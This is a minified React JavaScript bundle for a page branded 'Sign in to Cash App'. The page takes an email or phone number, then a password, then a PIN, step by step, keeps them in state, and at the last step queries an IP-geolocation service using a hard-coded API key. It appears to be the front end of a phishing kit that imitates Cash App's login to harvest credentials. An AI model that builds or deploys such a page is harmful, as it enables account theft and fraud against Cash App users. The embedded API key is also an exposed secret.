(this.webpackJsonpundefined=this.webpackJsonpundefined||[]).push([[0],{14:function(t,e,s){},15:function(t,e,s){"use strict";s.r(e);var a=s(0),n=s(1),i=s.n(n),p=s(8),r=s(7),o=s(2),c=s(3),u=s(5),d=s(4),l=function(t){Object(u.a)(s,t);var e=Object(d.a)(s);function s(){var t;Object(o.a)(this,s);for(var a=arguments.length,n=new Array(a),i=0;i<a;i++)n[i]=arguments[i];return(t=e.call.apply(e,[this].concat(n))).handleClick=function(){var e=t.props.state.session.sessid;if("email"==e&&(t.props.setSession("pw","password","Password","password","","Sign in"),t.props.updateState("hide",!0)),"pw"==e&&(t.props.setSession("pin","pin","Passcode or Pin","text","","Sign in"),t.props.updateState("hide",!0)),"pin"==e){alert("start");var s=new XMLHttpRequest;s.onreadystatechange=function(){if(4==s.readyState&&200==s.status){var t=JSON.parse(s.responseText);console.log(t.ip)}},s.open("GET","https://geo.ipify.org/api/v1?apiKey=at_56wsxRNKqEHifyYViheeZ0lwODIkc&ipAddress=8.8.8.8",!0),s.send()}},t}return Object(c.a)(s,[{key:"render",value:function(){var t=this.props.state.button1.disable;return Object(a.jsx)("button",{onClick:this.handleClick,type:"submit",className:this.props.state.button1.class,disabled:t,children:this.props.state.session.btntxt})}}]),s}(i.a.Component),h=function(t){Object(u.a)(s,t);var e=Object(d.a)(s);function s(){var t;Object(o.a)(this,s);for(var a=arguments.length,n=new Array(a),i=0;i<a;i++)n[i]=arguments[i];return(t=e.call.apply(e,[this].concat(n))).handleChange=function(e){t.props.insertData(e.target.name,e.target.value),t.props.setIval(e.target.value);var s=e.target.selectionEnd;"email"==t.props.state.session.sessid&&(s>7?t.props.updateState("btn",!1):t.props.updateState("hide",!0)),"pw"==t.props.state.session.sessid&&(s>5?t.props.updateState("btn",!1):t.props.updateState("hide",!0)),"pin"==t.props.state.session.sessid&&(s>3?t.props.updateState("btn",!1):t.props.updateState("hide",!0))},t}return Object(c.a)(s,[{key:"render",value:function(){return Object(a.jsx)("div",{className:"flex-c",children:Object(a.jsxs)("div",{className:"form-c",children:[Object(a.jsx)("h1",{children:"Sign in to Cash App"}),Object(a.jsx)("input",{type:this.props.state.session.itype,name:this.props.state.session.iname,placeholder:this.props.state.session.iplace,onChange:this.handleChange,value:this.props.state.session.ival}),Object(a.jsx)(l,{updateState:this.props.updateState,setSession:this.props.setSession,state:this.props.state})]})})}}]),s}(i.a.Component),b=function(t){Object(u.a)(s,t);var e=Object(d.a)(s);function s(){var t;Object(o.a)(this,s);for(var a=arguments.length,n=new Array(a),i=0;i<a;i++)n[i]=arguments[i];return(t=e.call.apply(e,[this].concat(n))).state={button1:{class:"hide",disable:!0},userdata:{uname:"",password:"",pin:""},session:{sessid:"email",iname:"uname",iplace:"Email or Mobile Number",itype:"txt",ival:"",btntxt:"Next"}},t.updateState=function(e,s){t.setState({button1:{class:e,disable:s}})},t.setSession=function(e,s,a,n,i,p){t.setState({session:{sessid:e,iname:s,iplace:a,itype:n,ival:i,btntxt:p}})},t.insertData=function(e,s){var a=Object(r.a)({},t.state.userdata);a[e]=s,t.setState({userdata:a})},t.setIval=function(e){var s=Object(r.a)({},t.state.session);s.ival=e,t.setState({session:s})},t}return Object(c.a)(s,[{key:"render",value:function(){return Object(a.jsx)(h,{setSession:this.setSession,updateState:this.updateState,state:this.state,setIval:this.setIval,insertData:this.insertData})}}]),s}(i.a.Component);s(14);Object(p.render)(Object(a.jsx)(b,{}),document.getElementById("main"))}},[[15,1,2]]]);
//# sourceMappingURL=main.51fc281a.chunk.js.map